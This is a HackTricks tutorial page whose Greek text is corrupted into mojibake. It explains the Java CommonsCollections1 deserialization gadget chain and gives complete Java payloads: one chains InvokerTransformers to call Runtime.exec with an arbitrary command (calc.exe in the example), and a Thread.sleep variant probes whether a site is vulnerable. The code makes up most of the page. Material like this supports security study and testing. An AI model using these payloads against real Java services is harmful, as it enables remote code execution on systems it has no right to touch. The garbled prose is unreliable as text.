# Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ Payload CommonsCollection1 - ÎœÎµÏ„Î±Ï„ÏÎ¿Ï€ÎµÎ¯Ï‚ Java ÏƒÎµ Rutime exec() ÎºÎ±Î¹ Thread Sleep

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Î•ÏÎ³Î¬Î¶ÎµÏƒÏ„Îµ ÏƒÎµ Î¼Î¹Î± **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚**; Î˜Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks**; Î‰ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ **Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… PEASS Î® Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF**; Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î Î‘ÎšÎ•Î¤Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î·Î½ [**ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Îµ ÏƒÏ„Î¿ **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î¿ [Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ hacktricks](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## ÎœÎµÏ„Î±Ï„ÏÎ¿Ï€ÎµÎ¯Ï‚ Java ÏƒÎµ Rutime exec()

Î£Îµ Ï€Î¿Î»Î»Î¬ Î¼Î­ÏÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± payload Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ Java Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€ÎµÎ¯Ï‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ Apache common collections ÏŒÏ€Ï‰Ï‚ Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
Î•Î¬Î½ Î´ÎµÎ½ Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¯Ï€Î¿Ï„Î± Î³Î¹Î± Ï„Î± Ï†Î¿ÏÏ„Î¯Î± Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ ÏƒÎµ Java, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´ÏÏƒÎºÎ¿Î»Î¿ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÏ„Îµ Î³Î¹Î±Ï„Î¯ Î±Ï…Ï„ÏŒÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î±Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®.

ÎšÎ±Ï„Î±ÏÏ‡Î¬Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÏŒÏ„Î¹ Î­Î½Î±Ï‚ **ÎœÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î®Ï‚ ÏƒÏ„Î·Î½ Java** ÎµÎ¯Î½Î±Î¹ ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… **Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¼Î¹Î± ÎºÎ»Î¬ÏƒÎ·** ÎºÎ±Î¹ Ï„Î·Î½ **Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ®**.\
Î•Ï€Î¯ÏƒÎ·Ï‚, ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ **Ï†Î¿ÏÏ„Î¯Î¿** Ï€Î¿Ï… **ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** ÎµÎ´Ï ÎµÎ¯Î½Î±Î¹ **Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î¿** Î¼Îµ:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
Î‰ **Î±ÎºÏÎ¹Î²Î­ÏƒÏ„ÎµÏÎ±**, Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### Î ÏÏ‚

Î›Î¿Î¹Ï€ÏŒÎ½, Ï€ÏÏ‚ Ï„Î¿ Ï€ÏÏÏ„Î¿ payload Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î¿ Î¼Îµ Î±Ï…Ï„Î¬ Ï„Î± "Î±Ï€Î»Î¬" one-liners;

**Î ÏÏÏ„Î¿Î½**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ ÏƒÏ„Î¿ payload ÏŒÏ„Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± **Î±Î»Ï…ÏƒÎ¯Î´Î± (Ï€Î¯Î½Î±ÎºÎ±Ï‚) Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼ÏÎ½**:
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
Î•Î¬Î½ Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±, Î¸Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ ÎµÎ¬Î½ ÎºÎ¬Ï€Ï‰Ï‚ Î±Î»Ï…ÏƒÎ¯Î´Ï‰ÏƒÎµÏ„Îµ Ï„Î· Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î® Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚.

Î›Î¿Î¹Ï€ÏŒÎ½, **Ï€ÏÏ‚ Î±Î»Ï…ÏƒÎ¯Î´Ï‰Î½Î¿Î½Ï„Î±Î¹ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î­Ï‚;**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
Î£Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± ÎµÎ½ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… payload Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ **Map**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `decorate` Î±Ï€ÏŒ Ï„Î¿ `LazyMap` Î¼Îµ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ map ÎºÎ±Î¹ Ï„Î¿Ï…Ï‚ Î±Î»Ï…ÏƒÎ¹Î´Ï‰Ï„Î¿ÏÏ‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚. Î‘Ï€ÏŒ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÏ„Î·Î½ Î±Î½Ï„Î¹Î³ÏÎ±Ï†Î® Ï„Ï‰Î½ Î±Î»Ï…ÏƒÎ¹Î´Ï‰Ï„ÏÎ½ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ `lazyMap.factory`.
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ÎšÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ Î¼ÎµÎ³Î¬Î»Î¿ Ï†Î¹Î½Î¬Î»Îµ: `lazyMap.get("Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ");`

Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `get`:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ÎšÎ±Î¹ Î±Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `transform`
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
Î›Î¿Î¹Ï€ÏŒÎ½, Î¸Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **ÎµÏÎ³Î¿ÏƒÏ„Î¬ÏƒÎ¹Î¿** ÎµÎ¯Ï‡Î±Î¼Îµ Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÎ¹ Ï„Î¿ **`chainedTransformer`** ÎºÎ±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· **`transform`** Ï€ÎµÏÎ½Î¬Î¼Îµ Î±Ï€ÏŒ ÏŒÎ»Î¿Ï…Ï‚ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï…Ï‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼Îµ Î­Î½Î±Î½ Î­Î½Î±Î½. Î¤Î¿ Î±ÏƒÏ„ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ **ÎºÎ¬Î¸Îµ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î®Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ `object`** **Ï‰Ï‚ ÎµÎ¯ÏƒÎ¿Î´Î¿** ÎºÎ±Î¹ Ï„Î¿ `object` ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Î±Ï€ÏŒ Ï„Î¿Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ ÎµÎºÏ„ÎµÎ»ÎµÏƒÎ¼Î­Î½Î¿ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î®. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, **ÏŒÎ»ÎµÏ‚ Î¿Î¹ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¯ÏƒÎµÎ¹Ï‚ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î±Î»Ï…ÏƒÎ¹Î´Ï‰Ï„Î¬ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ Ï†Î¿ÏÏ„Î¯Î¿**.

### Î ÎµÏÎ¯Î»Î·ÏˆÎ·

Î£Ï„Î¿ Ï„Î­Î»Î¿Ï‚, Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Ï„ÏÏŒÏ€Î¿Ï… Ï€Î¿Ï… Ï„Î¿ lazyMap Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¿Ï…Ï‚ Î±Î»Ï…ÏƒÎ¹Î´Ï‰Ï„Î¿ÏÏ‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î¼Î­Î¸Î¿Î´Î¿ get, ÎµÎ¯Î½Î±Î¹ ÏƒÎ±Î½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼Îµ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ±:
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ· Ï€ÏÏ‚ Î· `value` ÎµÎ¯Î½Î±Î¹ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ ÎºÎ¬Î¸Îµ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï ÎºÎ±Î¹ Î· Î­Î¾Î¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï… Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ Î¼ÏŒÎ½Î¿ ÎµÎ½Ï„Î¿Î»Î¹Î¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
ÎÎ± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ ÎµÎ´Ï **ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎ±Î½ Î¿Î¹ gadgets** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î¿ payload **ComonsCollections1**. Î‘Î»Î»Î¬ Î´ÎµÎ½ Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ **Ï€ÏÏ‚ Î¾ÎµÎºÎ¹Î½Î¬ Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ·** ÏŒÎ»Î¿Ï… Î±Ï…Ï„Î¿Ï. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ [ÎµÎ´Ï ÏŒÏ„Î¹ Ï„Î¿ **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java), Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ payload, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ `AnnotationInvocationHandler` ÎµÏ€ÎµÎ¹Î´Î® **ÏŒÏ„Î±Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯**, Î¸Î± **ÎºÎ±Î»Î­ÏƒÎµÎ¹** Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `payload.get()` Ï€Î¿Ï… Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿ Ï„Î¿ payload**.

## ÎšÎ±Î¸Ï…ÏƒÏ„Î­ÏÎ·ÏƒÎ· ÎÎ®Î¼Î±Ï„Î¿Ï‚ Java

Î‘Ï…Ï„ÏŒ Ï„Î¿ payload Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ **Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Î±Î½ Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î·, ÎºÎ±Î¸ÏÏ‚ Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎºÎ±Î¸Ï…ÏƒÏ„Î­ÏÎ·ÏƒÎ· Î±Î½ ÎµÎ¯Î½Î±Î¹**.
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Gadgets

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± gadgets ÎµÎ´Ï: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Î•ÏÎ³Î¬Î¶ÎµÏƒÏ„Îµ ÏƒÎµ Î¼Î¹Î± **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚**; Î˜Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks**; Î‰ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ **Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… PEASS Î® Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF**; Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î·Î½ [**ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Î£Ï…Î¼Î¼ÎµÏ„Î¬ÏƒÏ‡ÎµÏ„Îµ** ÏƒÏ„Î·Î½ [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Îµ ÏƒÏ„Î¿ **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± hacking tricks ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î¿ [Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ hacktricks](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
